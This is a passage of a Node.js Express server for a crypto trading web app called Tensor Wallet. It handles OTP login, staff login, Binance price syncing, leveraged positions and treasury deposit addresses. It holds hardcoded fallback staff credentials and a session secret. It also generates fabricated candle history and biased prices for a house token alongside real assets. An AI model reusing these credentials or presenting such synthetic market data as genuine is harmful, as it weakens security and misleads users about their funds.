'use strict';

const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const session = require('express-session');
const nodemailer = require('nodemailer');
const zlib = require('zlib');

const app = express();

/* -------------------- Config -------------------- */

const PORT = process.env.PORT || 3000;
const SESSION_SECRET = process.env.SESSION_SECRET || 'tensorwallet-secure-secret-key-change-this';

const STAFF_USERNAME = process.env.STAFF_USERNAME || 'admin';
const STAFF_PASSWORD = process.env.STAFF_PASSWORD || 'monterysasd';
const STAFF_EMAIL = process.env.STAFF_EMAIL || 'staff@tensor.local';

const IS_PROD = process.env.NODE_ENV === 'production' || process.env.RENDER === 'true';

const DATA_DIR = process.env.DATA_DIR || (IS_PROD ? '/data' : path.join(__dirname, 'data'));
const DB_PATH = path.join(DATA_DIR, 'wallets.json');

const BINANCE_BASE = 'https://api.binance.com';
const BINANCE_FALLBACK = 'https://data-api.binance.vision';

const PRICE_SYNC_MS = 5000;
const MARKET_LOOP_MS = 2500;
const BASE_CANDLE_MS = 5 * 60 * 1000;
const MAX_CANDLES = 5000;

const tensorCandleHistory = {};
let latestRealPrices = {};
let lastRealPriceSync = 0;

const REAL_SYMBOL_MAP = {
  BTC: 'BTCUSDT',
  ETH: 'ETHUSDT',
  SOL: 'SOLUSDT',
  BNB: 'BNBUSDT',
  XRP: 'XRPUSDT',
  DOGE: 'DOGEUSDT',
  ADA: 'ADAUSDT',
  AVAX: 'AVAXUSDT',
  LINK: 'LINKUSDT',
  TRX: 'TRXUSDT',
  LTC: 'LTCUSDT',
  TON: 'TONUSDT',
  SUI: 'SUIUSDT',
  PEPE: 'PEPEUSDT'
};

const TREASURY_USDT_ADDRESSES = {
  eth: {
    network: 'Ethereum',
    symbol: 'ETH',
    address: '0x0ab846457e6f9c7e9720a8e8782c9d1f8a260e5a'
  },
  arbitrum: {
    network: 'Arbitrum',
    symbol: 'ARB',
    address: '0x0ab846457e6f9c7e9720a8e8782c9d1f8a260e5a'
  },
  sol: {
    network: 'Solana',
    symbol: 'SOL',
    address: '9prrQtQxzdt5Kt7nPHUxwWAVQLZATrj2bjU27k5Xkt5i'
  },
  trx: {
    network: 'TRON',
    symbol: 'TRX',
    address: 'TPwY7YfXuufmgfCLF7ie9E2nyo6KhT4fn2'
  }
};

/* -------------------- Express Setup -------------------- */

app.set('trust proxy', 1);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  name: 'tensorwallet.sid',
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    secure: IS_PROD,
    maxAge: 1000 * 60 * 60 * 24 * 7
  }
}));

app.use('/api', (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  next();
});

/* -------------------- Basic Helpers -------------------- */

function nowIso() {
  return new Date().toISOString();
}

function sha(input) {
  return crypto.createHash('sha256').update(String(input)).digest('hex');
}

function normalizeEmail(email) {
  return String(email || '').trim().toLowerCase();
}

function safeNumber(value, fallback = 0) {
  const n = Number(value);
  return Number.isFinite(n) ? n : fallback;
}

function makeId(prefix = 'id') {
  return `${prefix}_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
}

function makePublicId(prefix = 'share') {
  return `${prefix}_${crypto.randomBytes(18).toString('hex')}`;
}

function safeJsonForEjs(obj) {
  return JSON.stringify(obj ?? null)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function ensureDataFolderOnly() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function getBaseUrl(req) {
  const envBase = process.env.PUBLIC_BASE_URL || process.env.BASE_URL;
  if (envBase) return envBase.replace(/\/+$/, '');
  return `${req.protocol}://${req.get('host')}`;
}

function normalizeNetwork(network) {
  const raw = String(network || '').trim().toLowerCase();

  if (raw.includes('arb')) return 'arbitrum';
  if (raw.includes('sol')) return 'sol';
  if (raw.includes('tron') || raw.includes('trc') || raw.includes('trx')) return 'trx';
  if (raw.includes('eth') || raw.includes('erc')) return 'eth';

  return 'eth';
}

function getTreasuryDestination(network) {
  const key = normalizeNetwork(network);
  return {
    key,
    ...TREASURY_USDT_ADDRESSES[key]
  };
}

function getSolanaDestination() {
  return {
    key: 'sol',
    ...TREASURY_USDT_ADDRESSES.sol
  };
}

function formatPrice(n) {
  const num = safeNumber(n, 0);

  if (num >= 1000) return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  if (num >= 1) return num.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 4 });

  return num.toLocaleString('en-US', { minimumFractionDigits: 6, maximumFractionDigits: 6 });
}

/* -------------------- Default Data -------------------- */

function defaultTensorAssets() {
  return [
    {
      id: 'real_btc',
      name: 'Bitcoin',
      symbol: 'BTC',
      price: 68000,
      startPrice: 68000,
      bias: 'real',
      bullChance: 50,
      minPct: 0.001,
      maxPct: 0.004,
      icon: '₿',
      supply: 21000000,
      marketCap: 68000 * 21000000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 68000,
      low24h: 68000,
      lifetimeHigh: 68000
    },
    {
      id: 'real_eth',
      name: 'Ethereum',
      symbol: 'ETH',
      price: 3800,
      startPrice: 3800,
      bias: 'real',
      bullChance: 50,
      minPct: 0.001,
      maxPct: 0.004,
      icon: 'Ξ',
      supply: 120000000,
      marketCap: 3800 * 120000000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 3800,
      low24h: 3800,
      lifetimeHigh: 3800
    },
    {
      id: 'real_sol',
      name: 'Solana',
      symbol: 'SOL',
      price: 170,
      startPrice: 170,
      bias: 'real',
      bullChance: 50,
      minPct: 0.001,
      maxPct: 0.006,
      icon: '◎',
      supply: 580000000,
      marketCap: 170 * 580000000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 170,
      low24h: 170,
      lifetimeHigh: 170
    },
    {
      id: 'real_bnb',
      name: 'BNB',
      symbol: 'BNB',
      price: 600,
      startPrice: 600,
      bias: 'real',
      bullChance: 50,
      minPct: 0.001,
      maxPct: 0.004,
      icon: 'B',
      supply: 150000000,
      marketCap: 600 * 150000000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 600,
      low24h: 600,
      lifetimeHigh: 600
    },
    {
      id: 'real_xrp',
      name: 'XRP',
      symbol: 'XRP',
      price: 0.55,
      startPrice: 0.55,
      bias: 'real',
      bullChance: 50,
      minPct: 0.001,
      maxPct: 0.006,
      icon: 'X',
      supply: 99980000000,
      marketCap: 0.55 * 99980000000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 0.55,
      low24h: 0.55,
      lifetimeHigh: 0.55
    },
    {
      id: 'real_doge',
      name: 'Dogecoin',
      symbol: 'DOGE',
      price: 0.16,
      startPrice: 0.16,
      bias: 'real',
      bullChance: 50,
      minPct: 0.001,
      maxPct: 0.008,
      icon: 'D',
      supply: 145000000000,
      marketCap: 0.16 * 145000000000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 0.16,
      low24h: 0.16,
      lifetimeHigh: 0.16
    },
    {
      id: 'tensor_ai',
      name: 'Tensor AI',
      symbol: 'TAI',
      price: 1.25,
      startPrice: 1.25,
      bias: 'balanced',
      bullChance: 54,
      minPct: 0.002,
      maxPct: 0.012,
      icon: 'T',
      supply: 10000000,
      marketCap: 12500000,
      volume: 0,
      dominance: 0,
      changePercent24h: 0,
      high24h: 1.25,
      low24h: 1.25,
      lifetimeHigh: 1.25
    }
  ];
}

function defaultDb() {
  return {
    users: {},
    otps: {},
    tensorRegistry: defaultTensorAssets(),
    treasury: {
      collectedFeesUsdt: 0,
      tradeDeposits: []
    },
    publicTradeCards: {}
  };
}

/* -------------------- Database -------------------- */

function readDbRaw() {
  try {
    const raw = fs.readFileSync(DB_PATH, 'utf8');
    return JSON.parse(raw || '{}');
  } catch {
    return defaultDb();
  }
}

function writeDb(db) {
  ensureDataFolderOnly();

  const tempPath = `${DB_PATH}.tmp`;
  fs.writeFileSync(tempPath, JSON.stringify(db, null, 2));
  fs.renameSync(tempPath, DB_PATH);
}

function ensureDb() {
  ensureDataFolderOnly();

  if (!fs.existsSync(DB_PATH)) {
    writeDb(defaultDb());
    return;
  }

  const db = readDbRaw();
  migrateDb(db);
  writeDb(db);
}

function readDb() {
  ensureDataFolderOnly();

  if (!fs.existsSync(DB_PATH)) {
    writeDb(defaultDb());
  }

  const db = readDbRaw();
  migrateDb(db);
  return db;
}

function migrateDb(db) {
  if (!db.users) db.users = {};
  if (!db.otps) db.otps = {};
  if (!Array.isArray(db.tensorRegistry)) db.tensorRegistry = [];
  if (db.tensorRegistry.length === 0) db.tensorRegistry = defaultTensorAssets();

  if (!db.treasury) db.treasury = { collectedFeesUsdt: 0, tradeDeposits: [] };
  if (!Array.isArray(db.treasury.tradeDeposits)) db.treasury.tradeDeposits = [];

  if (!db.publicTradeCards) db.publicTradeCards = {};

  db.tensorRegistry.forEach(migrateToken);
  Object.values(db.users).forEach(migrateUser);
}

function migrateUser(user) {
  if (!user) return;

  if (!user.email) user.email = '';
  if (!user.id && user.email) user.id = `wallet_${sha(user.email).slice(0, 20)}`;
  if (!user.role) user.role = 'user';
  if (!user.createdAt) user.createdAt = nowIso();
  if (!user.updatedAt) user.updatedAt = nowIso();

  if (!Array.isArray(user.assets)) user.assets = [];
  if (!Array.isArray(user.publicWallets)) user.publicWallets = [];
  if (!Array.isArray(user.wallets)) user.wallets = [];
  if (!Array.isArray(user.balances)) user.balances = [];

  if (!user.tensorAddress && user.email) user.tensorAddress = `T0x${sha(user.email).slice(0, 40)}`;
  if (!user.tensorVault) user.tensorVault = null;
  if (!user.tensorBalances) user.tensorBalances = {};

  user.usdtBalance = safeNumber(user.usdtBalance, user.role === 'staff' ? 1000000 : 15000);
  user.ousdBalance = safeNumber(user.ousdBalance, user.role === 'staff' ? 500000 : 0);
  user.usdtNetwork = normalizeNetwork(user.usdtNetwork || 'eth');

  if (!Array.isArray(user.positions)) user.positions = [];
  if (!Array.isArray(user.orderHistory)) user.orderHistory = [];
  if (!Array.isArray(user.publicTradeCards)) user.publicTradeCards = [];
  if (!Array.isArray(user.tradeDeposits)) user.tradeDeposits = [];

  if (!user.copyState) {
    user.copyState = {
      isCopyTrader: false,
      copyingTarget: null,
      copyBalance: 0,
      activeCopyTrades: []
    };
  }

  user.copyState.isCopyTrader = !!user.copyState.isCopyTrader;
  user.copyState.copyingTarget = user.copyState.copyingTarget || null;
  user.copyState.copyBalance = safeNumber(user.copyState.copyBalance, 0);
  if (!Array.isArray(user.copyState.activeCopyTrades)) user.copyState.activeCopyTrades = [];

  user.positions.forEach(migratePosition);
  user.orderHistory.forEach(migratePosition);
  user.copyState.activeCopyTrades.forEach(migratePosition);
}

function migratePosition(pos) {
  if (!pos.id) pos.id = makeId('pos');

  pos.tokenId = pos.tokenId || null;
  pos.symbol = String(pos.symbol || 'BTC').toUpperCase();
  pos.side = pos.side === 'short' ? 'short' : 'long';
  pos.margin = safeNumber(pos.margin, 0);
  pos.leverage = Math.max(1, safeNumber(pos.leverage, 1));
  pos.size = safeNumber(pos.size, pos.margin * pos.leverage);
  pos.entryPrice = Math.max(0.000001, safeNumber(pos.entryPrice, 1));
  pos.markPrice = Math.max(0.000001, safeNumber(pos.markPrice, pos.entryPrice));
  pos.pnl = safeNumber(pos.pnl, 0);
  pos.roi = safeNumber(pos.roi, 0);
  pos.marginMode = pos.marginMode || 'cross';
  pos.currency = String(pos.currency || pos.wallet || 'USDT').toUpperCase();
  pos.status = pos.status || 'open';
  pos.openedAt = pos.openedAt || nowIso();
}

function migrateToken(token) {
  if (!token.id) token.id = makeId('asset');
  if (!token.name) token.name = token.symbol || 'Tensor Asset';
  if (!token.symbol) token.symbol = 'TENSOR';

  token.symbol = String(token.symbol).toUpperCase();
  token.price = Math.max(0.000001, safeNumber(token.price, 1));
  token.startPrice = Math.max(0.000001, safeNumber(token.startPrice, token.price));
  token.bias = token.bias || 'balanced';
  token.bullChance = safeNumber(token.bullChance, 50);
  token.minPct = safeNumber(token.minPct, 0.001);
  token.maxPct = safeNumber(token.maxPct, 0.005);
  token.icon = token.icon || token.symbol.slice(0, 1);
  token.supply = Math.max(1, safeNumber(token.supply, 10000000));
  token.marketCap = token.price * token.supply;
  token.volume = safeNumber(token.volume, 0);
  token.dominance = safeNumber(token.dominance, 0);
  token.changePercent24h = safeNumber(token.changePercent24h, 0);
  token.high24h = safeNumber(token.high24h, token.price);
  token.low24h = safeNumber(token.low24h, token.price);
  token.lifetimeHigh = Math.max(
    safeNumber(token.lifetimeHigh, token.price),
    token.price,
    safeNumber(token.high24h, token.price)
  );
}

/* -------------------- Users -------------------- */

function createWalletRecord(email, role = 'user') {
  const hash = sha(email);

  return {
    id: `wallet_${hash.slice(0, 20)}`,
    email,
    role,
    createdAt: nowIso(),
    updatedAt: nowIso(),

    assets: [],
    publicWallets: [],
    wallets: [],
    balances: [],

    tensorAddress: `T0x${hash.slice(0, 40)}`,
    tensorVault: null,
    tensorBalances: {},

    usdtBalance: role === 'staff' ? 1000000 : 15000,
    ousdBalance: role === 'staff' ? 500000 : 0,
    usdtNetwork: 'eth',

    positions: [],
    orderHistory: [],
    publicTradeCards: [],
    tradeDeposits: [],

    copyState: {
      isCopyTrader: false,
      copyingTarget: null,
      copyBalance: 0,
      activeCopyTrades: []
    }
  };
}

function getOrCreateUser(email, role = 'user') {
  const normEmail = normalizeEmail(email);
  const db = readDb();

  if (!db.users[normEmail]) {
    db.users[normEmail] = createWalletRecord(normEmail, role);
    writeDb(db);
  } else {
    migrateUser(db.users[normEmail]);

    if (role === 'staff') {
      db.users[normEmail].role = 'staff';
      db.users[normEmail].usdtBalance = Math.max(safeNumber(db.users[normEmail].usdtBalance, 0), 1000000);
      db.users[normEmail].ousdBalance = Math.max(safeNumber(db.users[normEmail].ousdBalance, 0), 500000);
      writeDb(db);
    }
  }

  return db.users[normEmail];
}

function publicWallet(user) {
  return {
    id: user.id,
    email: user.email,
    role: user.role,
    createdAt: user.createdAt,
    tensorAddress: user.tensorAddress,

    usdtBalance: safeNumber(user.usdtBalance, 0),
    ousdBalance: safeNumber(user.ousdBalance, 0),
    usdtNetwork: user.usdtNetwork || 'eth',

    assets: user.assets || [],
    publicWallets: user.publicWallets || [],
    wallets: user.wallets || [],
    balances: user.balances || [],

    positions: user.positions || [],
    orderHistory: user.orderHistory || [],
    publicTradeCards: user.publicTradeCards || [],
    tradeDeposits: user.tradeDeposits || [],

    copyState: {
      isCopyTrader: !!user.copyState?.isCopyTrader,
      copyingTarget: user.copyState?.copyingTarget || null,
      copyBalance: safeNumber(user.copyState?.copyBalance, 0),
      activeCopyTrades: user.copyState?.activeCopyTrades || []
    }
  };
}

/* -------------------- Auth Middleware -------------------- */

function requireAuth(req, res, next) {
  if (!req.session.user || !req.session.user.email) {
    return res.redirect('/');
  }

  next();
}

function requireAuthJson(req, res, next) {
  if (!req.session.user || !req.session.user.email) {
    return res.status(401).json({ error: 'Not authenticated.' });
  }

  next();
}

/* -------------------- OTP -------------------- */

function generateOtp() {
  return String(crypto.randomInt(100000, 999999));
}

function saveOtp(email, otp) {
  const db = readDb();
  const normEmail = normalizeEmail(email);

  db.otps[normEmail] = {
    otpHash: sha(otp),
    expiresAt: Date.now() + 10 * 60 * 1000,
    attempts: 0
  };

  writeDb(db);
}

function verifyOtp(email, otp) {
  const db = readDb();
  const normEmail = normalizeEmail(email);
  const record = db.otps[normEmail];

  if (!record) return { ok: false, reason: 'No OTP found. Please request a new code.' };

  if (Date.now() > record.expiresAt) {
    delete db.otps[normEmail];
    writeDb(db);
    return { ok: false, reason: 'OTP expired. Please request a new code.' };
  }

  if (record.attempts >= 5) {
    delete db.otps[normEmail];
    writeDb(db);
    return { ok: false, reason: 'Too many attempts. Please request a new code.' };
  }

  if (sha(otp) !== record.otpHash) {
    record.attempts += 1;
    db.otps[normEmail] = record;
    writeDb(db);
    return { ok: false, reason: 'Invalid code.' };
  }

  delete db.otps[normEmail];
  writeDb(db);
  return { ok: true };
}

async function sendOtpEmail(email, otp) {
  const gmailUser = process.env.GMAIL_USER;
  const gmailPass = process.env.GMAIL_APP_PASSWORD;

  if (!gmailUser || !gmailPass) {
    console.log(`DEV OTP for ${email}: ${otp}`);
    return false;
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: gmailUser,
      pass: gmailPass
    }
  });

  await transporter.sendMail({
    from: `"Tensor Wallet" <${gmailUser}>`,
    to: email,
    subject: 'Your Tensor Wallet login code',
    text: `Your Tensor Wallet login code is ${otp}. It expires in 10 minutes.`,
    html: `
      <div style="font-family:Arial,sans-serif;background:#0b0e11;color:#fff;padding:24px;border-radius:12px">
        <h2>Tensor Wallet</h2>
        <p>Your login code is:</p>
        <h1 style="letter-spacing:4px">${otp}</h1>
        <p>This code expires in 10 minutes.</p>
      </div>
    `
  });

  return true;
}

/* -------------------- Safe Render Helpers -------------------- */

function fallbackIndexHtml(data = {}) {
  const error = data.error ? `<div class="msg error">${escapeHtml(data.error)}</div>` : '';
  const message = data.message ? `<div class="msg ok">${escapeHtml(data.message)}</div>` : '';
  const email = escapeHtml(data.email || '');

  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Tensor Login</title>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <style>
        body{margin:0;background:#0b0e11;color:#eaecef;font-family:Arial,sans-serif;display:grid;place-items:center;min-height:100vh;padding:20px}
        .box{width:100%;max-width:420px;background:#1e2329;border:1px solid #2b3139;border-radius:18px;padding:24px}
        h1{margin:0 0 10px;font-size:28px}
        p{color:#848e9c}
        input{width:100%;box-sizing:border-box;margin:8px 0;padding:14px;border-radius:10px;border:1px solid #2b3139;background:#0b0e11;color:#fff}
        button{width:100%;margin-top:8px;padding:14px;border-radius:10px;border:0;background:#8b5cf6;color:#fff;font-weight:900}
        .msg{padding:12px;border-radius:10px;margin:10px 0;font-weight:800}
        .error{background:rgba(246,70,93,.15);color:#f6465d}
        .ok{background:rgba(14,203,129,.15);color:#0ecb81}
        hr{border:0;border-top:1px solid #2b3139;margin:22px 0}
      </style>
    </head>
    <body>
      <div class="box">
        <h1>Tensor Wallet</h1>
        <p>Login with email code.</p>
        ${error}
        ${message}

        <form method="POST" action="/auth/request-otp">
          <input name="email" type="email" placeholder="Email" value="${email}" required>
          <button type="submit">Send Code</button>
        </form>

        <form method="POST" action="/auth/verify">
          <input name="email" type="email" placeholder="Email" value="${email}" required>
          <input name="otp" type="text" placeholder="6-digit code" required>
          <button type="submit">Verify</button>
        </form>

        <hr>

        <form method="POST" action="/staff/login">
          <input name="username" placeholder="Staff username">
          <input name="password" type="password" placeholder="Staff password">
          <button type="submit">Staff Login</button>
        </form>
      </div>
    </body>
    </html>
  `;
}

function renderIndex(req, res, extra = {}) {
  const data = {
    error: null,
    message: null,
    email: '',
    user: req.session.user || null,
    safeJsonForEjs,
    escapeHtml,
    ...extra
  };

  const indexPath = path.join(__dirname, 'views', 'index.ejs');

  if (!fs.existsSync(indexPath)) {
    return res.status(extra.statusCode || 200).send(fallbackIndexHtml(data));
  }

  return res.status(extra.statusCode || 200).render('index', data, (err, html) => {
    if (err) {
      console.error('INDEX EJS ERROR:', err);
      return res.status(200).send(fallbackIndexHtml({
        ...data,
        error: IS_PROD ? 'Login page template error.' : `index.ejs error: ${err.message}`
      }));
    }

    return res.send(html);
  });
}

function renderTrading(req, res, user) {
  const walletJson = safeJsonForEjs(publicWallet(user));
  const treasuryJson = safeJsonForEjs(TREASURY_USDT_ADDRESSES);

  return res.render('trading', {
    wallet: walletJson,
    treasury: treasuryJson,
    user: publicWallet(user),
    safeJsonForEjs,
    escapeHtml,
    formatPrice
  }, (err, html) => {
    if (err) {
      console.error('TRADING EJS ERROR:', err);

      return res.status(500).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Trading Template Error</title>
          <meta name="viewport" content="width=device-width,initial-scale=1">
          <style>
            body{background:#0b0e11;color:#eaecef;font-family:Arial,sans-serif;padding:20px}
            pre{white-space:pre-wrap;background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:16px;color:#f6465d}
            a{color:#8b5cf6}
          </style>
        </head>
        <body>
          <h1>trading.ejs error</h1>
          <p>The server is working, but your <b>views/trading.ejs</b> has a template error.</p>
          <pre>${escapeHtml(err.stack || err.message)}</pre>
          <a href="/">Back to index</a>
        </body>
        </html>
      `);
    }

    return res.send(html);
  });
}

/* -------------------- Price Engine -------------------- */

async function fetchJsonWithTimeout(url, options = {}, timeoutMs = 8000) {
  if (typeof fetch !== 'function') {
    throw new Error('Global fetch is unavailable. Use Node 18+.');
  }

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: {
        accept: 'application/json',
        'user-agent': 'TensorWallet/1.0',
        ...(options.headers || {})
      }
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return await response.json();
  } finally {
    clearTimeout(timer);
  }
}

async function syncRealCryptoPrices(force = false) {
  try {
    if (!force && Date.now() - lastRealPriceSync < PRICE_SYNC_MS) {
      return latestRealPrices;
    }

    const symbols = Object.values(REAL_SYMBOL_MAP);
    const symbolsParam = encodeURIComponent(JSON.stringify(symbols));

    let data;

    try {
      data = await fetchJsonWithTimeout(`${BINANCE_BASE}/api/v3/ticker/24hr?symbols=${symbolsParam}`, {}, 4500);
    } catch {
      data = await fetchJsonWithTimeout(`${BINANCE_FALLBACK}/api/v3/ticker/24hr?symbols=${symbolsParam}`, {}, 4500);
    }

    if (!Array.isArray(data)) return latestRealPrices;

    const nextPrices = { ...latestRealPrices };

    data.forEach(item => {
      if (!item || !item.symbol) return;

      const price = Number(item.lastPrice);
      if (!Number.isFinite(price) || price <= 0) return;

      nextPrices[item.symbol] = {
        symbol: item.symbol,
        price,
        changePercent: safeNumber(item.priceChangePercent, 0),
        high: safeNumber(item.highPrice, price),
        low: safeNumber(item.lowPrice, price),
        volume: safeNumber(item.quoteVolume, 0),
        syncedAt: Date.now()
      };
    });

    latestRealPrices = nextPrices;
    lastRealPriceSync = Date.now();

    return latestRealPrices;
  } catch (err) {
    console.error('Real price sync failed:', err.message);
    return latestRealPrices;
  }
}

function getTokenByIdOrSymbol(db, tokenIdOrSymbol) {
  const raw = String(tokenIdOrSymbol || '');
  const query = raw.toUpperCase();

  return db.tensorRegistry.find(t => {
    return String(t.id) === raw || String(t.symbol || '').toUpperCase() === query;
  });
}

function initializeCandlesForToken(tokenId, startPrice) {
  if (tensorCandleHistory[tokenId] && tensorCandleHistory[tokenId].length) return;

  const candles = [];
  let price = Math.max(0.000001, safeNumber(startPrice, 1));
  let timeCursor = Date.now() - 14 * 24 * 60 * 60 * 1000;

  for (let i = 0; i < 4032; i++) {
    const open = price;
    const close = Math.max(0.000001, open * (1 + (Math.random() - 0.5) * 0.004));
    const high = Math.max(open, close) * (1 + Math.random() * 0.002);
    const low = Math.max(0.000001, Math.min(open, close) * (1 - Math.random() * 0.002));

    candles.push({
      time: timeCursor,
      open,
      high,
      low,
      close,
      volume: Math.round(50000 + Math.random() * 750000)
    });

    price = close;
    timeCursor += BASE_CANDLE_MS;
  }

  tensorCandleHistory[tokenId] = candles.slice(-MAX_CANDLES);
}

function appendCandle(token) {
  initializeCandlesForToken(token.id, token.price);

  const candles = tensorCandleHistory[token.id];
  const last = candles[candles.length - 1];
  const now = Date.now();
  const price = Math.max(0.000001, safeNumber(token.price, 1));

  if (!last || now - last.time >= BASE_CANDLE_MS) {
    candles.push({
      time: now,
      open: price,
      high: price,
      low: price,
      close: price,
      volume: Math.round(50000 + Math.random() * 500000)
    });
  } else {
    last.high = Math.max(last.high, price);
    last.low = Math.min(last.low, price);
    last.close = price;
    last.volume += Math.round(1000 + Math.random() * 25000);
  }

  if (candles.length > MAX_CANDLES) {
    candles.splice(0, candles.length - MAX_CANDLES);
  }
}

function moveSyntheticToken(token) {
  if (token.bias === 'real') return;

  const chance = Math.max(1, Math.min(99, safeNumber(token.bullChance, 50)));
  const direction = Math.random() * 100 <= chance ? 1 : -1;

  const minPct = Math.max(0, safeNumber(token.minPct, 0.001));
  const maxPct = Math.max(minPct, safeNumber(token.maxPct, 0.006));
  const pct = minPct + Math.random() * (maxPct - minPct);

  token.price = Math.max(0.000001, token.price * (1 + direction * pct));
}

function syncRegistryWithPrices(db) {
  let totalMarketCap = 0;

  db.tensorRegistry.forEach(token => {
    const symbol = String(token.symbol || '').toUpperCase();
    const pair = REAL_SYMBOL_MAP[symbol];

    if (pair && latestRealPrices[pair]) {
      const live = latestRealPrices[pair];

      token.price = live.price;
      token.changePercent24h = live.changePercent;
      token.high24h = live.high;
      token.low24h = live.low;
      token.volume = live.volume;
      token.marketCap = token.price * safeNumber(token.supply, 1);
      token.lifetimeHigh = Math.max(safeNumber(token.lifetimeHigh, token.price), token.price, live.high);
    } else {
      moveSyntheticToken(token);

      token.high24h = Math.max(safeNumber(token.high24h, token.price), token.price);
      token.low24h = Math.min(safeNumber(token.low24h, token.price), token.price);
      token.lifetimeHigh = Math.max(safeNumber(token.lifetimeHigh, token.price), token.price);
      token.changePercent24h = ((token.price - safeNumber(token.startPrice, token.price)) / safeNumber(token.startPrice, token.price)) * 100;
      token.volume = safeNumber(token.volume, 0) + Math.round(Math.random() * 25000);
      token.marketCap = token.price * safeNumber(token.supply, 1);
    }

    appendCandle(token);
    totalMarketCap += safeNumber(token.marketCap, 0);
  });

  db.tensorRegistry.forEach(token => {
    token.dominance = totalMarketCap > 0 ? token.marketCap / totalMarketCap * 100 : 0;
  });
}

function getMarketPrice(db, tokenIdOrSymbol) {
  const token = getTokenByIdOrSymbol(db, tokenIdOrSymbol);
  return Math.max(0.000001, safeNumber(token?.price, 1));
}

function calculatePosition(pos, markPrice) {
  const entry = Math.max(0.000001, safeNumber(pos.entryPrice, 1));
  const size = safeNumber(pos.size, 0);
  const margin = Math.max(0.000001, safeNumber(pos.margin, 0));

  const priceMovePct = pos.side === 'short'
    ? (entry - markPrice) / entry
    : (markPrice - entry) / entry;

  const pnl = size * priceMovePct;
  const roi = pnl / margin * 100;

  return {
    markPrice,
    pnl,
    roi
  };
}

function updateUserPositions(user, db) {
  user.positions.forEach(pos => {
    if (pos.status !== 'open') return;

    const price = getMarketPrice(db, pos.tokenId || pos.symbol);
    const calc = calculatePosition(pos, price);

    pos.markPrice = calc.markPrice;
    pos.pnl = calc.pnl;
    pos.roi = calc.roi;
    pos.updatedAt = nowIso();
  });

  user.copyState.activeCopyTrades.forEach(pos => {
    if (pos.status !== 'open') return;

    const price = getMarketPrice(db, pos.tokenId || pos.symbol);
    const calc = calculatePosition(pos, price);

    pos.markPrice = calc.markPrice;
    pos.pnl = calc.pnl;
    pos.roi = calc.roi;
    pos.updatedAt = nowIso();
  });
}

async function marketLoop() {
  try {
    await syncRealCryptoPrices(false);

    const db = readDb();

    syncRegistryWithPrices(db);

    Object.values(db.users || {}).forEach(user => {
      migrateUser(user);
      updateUserPositions(user, db);
    });

    writeDb(db);
  } catch (err) {
    console.error('Market loop failed:', err.message);
  }
}

/* -------------------- PNG Generation -------------------- */

function crc32(buf) {
  const table = crc32.table || (crc32.table = (() => {
    const arr = new Uint32Array(256);

    for (let i = 0; i < 256; i++) {
      let c = i;

      for (let k = 0; k < 8; k++) {
        c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
      }

      arr[i] = c >>> 0;
    }

    return arr;
  })());

  let crc = -1;

  for (let i = 0; i < buf.length; i++) {
    crc = table[(crc ^ buf[i]) & 0xff] ^ (crc >>> 8);
  }

  return (crc ^ -1) >>> 0;
}

function pngChunk(type, data) {
  const typeBuf = Buffer.from(type);
  const lenBuf = Buffer.alloc(4);
  lenBuf.writeUInt32BE(data.length, 0);

  const crcBuf = Buffer.alloc(4);
  crcBuf.writeUInt32BE(crc32(Buffer.concat([typeBuf, data])), 0);

  return Buffer.concat([lenBuf, typeBuf, data, crcBuf]);
}

function makeTradePng(card) {
  const width = 1000;
  const height = 520;
  const channels = 4;
  const raw = Buffer.alloc((width * channels + 1) * height, 255);

  function setPixel(x, y, r, g, b, a = 255) {
    if (x < 0 || y < 0 || x >= width || y >= height) return;

    const rowStart = y * (width * channels + 1);
    const idx = rowStart + 1 + x * channels;

    raw[idx] = r;
    raw[idx + 1] = g;
    raw[idx + 2] = b;
    raw[idx + 3] = a;
  }

  function rect(x, y, w, h, r, g, b, a = 255) {
    for (let yy = y; yy < y + h; yy++) {
      for (let xx = x; xx < x + w; xx++) {
        setPixel(xx, yy, r, g, b, a);
      }
    }
  }

  const pnl = safeNumber(card.pnl, 0);
  const good = pnl >= 0;

  rect(0, 0, width, height, 11, 14, 17);
  rect(40, 40, width - 80, height - 80, 30, 35, 41);
  rect(40, 40, 12, height - 80, good ? 14 : 246, good ? 203 : 70, good ? 129 : 93);

  for (let i = 0; i < 18; i++) {
    const x = 120 + i * 45;
    const h = 40 + Math.round(Math.random() * 220);
